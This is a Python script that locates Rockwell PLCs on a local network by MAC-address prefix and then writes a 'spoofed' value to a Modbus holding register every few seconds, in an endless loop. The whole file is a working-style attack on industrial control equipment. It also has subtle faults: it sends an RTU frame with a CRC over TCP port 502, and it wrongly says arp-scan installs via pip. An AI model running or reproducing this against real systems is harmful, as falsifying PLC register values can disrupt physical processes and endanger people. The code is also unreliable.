import socket
import struct
import time
import subprocess  # For finding the PLC's IP address

# Configuration
PLC_IP = None  # Initialize PLC_IP to None.  Will be discovered if needed.
PLC_PORT = 502  # Default Modbus port (Rockwell PLCs often use this)
REGISTER_TO_SPOOF = 40001  # Example: Address of the first holding register to spoof.  **CHANGE THIS to the actual register.**
SPOOFED_VALUE = 12345  # The spoofed value to send.  **CHANGE THIS to the desired spoofed value.**
SPOOF_INTERVAL = 5  # Seconds between sending spoofed messages.  **CHANGE THIS to the desired interval.**
MODBUS_UNIT_ID = 1 #Often 1. Check your device configuration.  Modbus unit ID.

def find_plc_ip():
    """
    Attempts to find the PLC's IP address by pinging the network and looking for devices
    responding to common Rockwell MAC addresses.  This is a *very* basic approach and
    may not work in all environments. It's provided as a starting point.
    """
    try:
        # Basic network scan using arp-scan (requires installation: `pip install python-arpscan`)
        # arp-scan needs root privileges on many systems. This might fail if not run as root.
        result = subprocess.run(['arp-scan', '-l', '-q'], capture_output=True, text=True, check=True)
        output = result.stdout
        print(f"ARP Scan Result: {output}")

        # Common Rockwell MAC address prefixes (adjust as needed)
        rockwell_mac_prefixes = ['00:01:05', '00:00:BC', '00:01:C1', '00:02:44']  # Add more if needed.
        for line in output.splitlines():
            parts = line.split()
            if len(parts) >= 2:
                ip_address = parts[0]
                mac_address = parts[1]
                for prefix in rockwell_mac_prefixes:
                    if mac_address.startswith(prefix):
                        print(f"Found potential Rockwell PLC: IP Address = {ip_address}, MAC Address = {mac_address}")
                        return ip_address # Return the first one found. You may need to refine this.
        print("No Rockwell PLC found using ARP scan with known MAC prefixes.")
        return None # Could not find the PLC

    except FileNotFoundError:
        print("arp-scan not found.  Please install it (e.g., 'sudo apt install arp-scan') or configure PLC_IP manually.")
        return None # Could not find ARP Scan
    except subprocess.CalledProcessError as e:
        print(f"Error running arp-scan: {e}")
        return None # Could not run ARP scan


def create_modbus_rtu_frame(register, value, unit_id):
    """
    Creates a Modbus RTU frame to write a single register.
    This function uses Modbus function code 0x06 (Write Single Register).
    """
    # Function code 0x06: Write Single Register
    function_code = 0x06

    # Start Address (Register Address - 1 for Modbus addressing)
    start_address = register - 1

    # Value to write (2 bytes)
    value_bytes = struct.pack('>H', value)

    # Build the PDU (Protocol Data Unit)
    pdu = struct.pack('>BBH', unit_id, function_code, start_address) + value_bytes

    # Calculate CRC16
    crc = calculate_crc16(pdu)

    # Append CRC to the frame (least significant byte first)
    frame = pdu + struct.pack('<H', crc)

    return frame


def calculate_crc16(data):
    """Calculates Modbus RTU CRC16 checksum."""
    crc = 0xFFFF
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x0001:
                crc >>= 1
                crc ^= 0xA001
            else:
                crc >>= 1
    return crc


def spoof_reporting_message(plc_ip, plc_port, register, spoofed_value, unit_id):
    """
    Spoofs a reporting message by sending a Modbus write request with a modified value.
    """
    try:
        # Create a TCP socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(5)  # Set a timeout for the connection

        # Connect to the PLC
        client_socket.connect((plc_ip, plc_port))
        print(f"Connected to PLC at {plc_ip}:{plc_port}")

        # Create the Modbus RTU write frame
        modbus_frame = create_modbus_rtu_frame(register, spoofed_value, unit_id)


        # Send the Modbus frame
        client_socket.sendall(modbus_frame)
        print(f"Sent spoofed value {spoofed_value} to register {register} (Unit ID: {unit_id})")

        # Optional: Receive and print the response (for debugging/confirmation)
        response = client_socket.recv(1024)  # Receive up to 1024 bytes
        print(f"Received response: {response.hex()}")


    except socket.timeout:
        print("Connection timed out.")
    except ConnectionRefusedError:
        print("Connection refused.  Ensure the PLC is running and Modbus is enabled.")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        try:
            client_socket.close()
        except:
            pass  #Socket might not be initialized.
        print("Connection closed.")


if __name__ == "__main__":

    if PLC_IP is None:
        print("PLC_IP not configured. Attempting to discover...")
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("Failed to discover PLC IP.  Please set PLC_IP manually at the top of the script.")
            exit()
        else:
            print(f"Discovered PLC IP: {PLC_IP}")
    else:
        print(f"Using configured PLC IP: {PLC_IP}")

    while True:
        spoof_reporting_message(PLC_IP, PLC_PORT, REGISTER_TO_SPOOF, SPOOFED_VALUE, MODBUS_UNIT_ID)
        time.sleep(SPOOF_INTERVAL)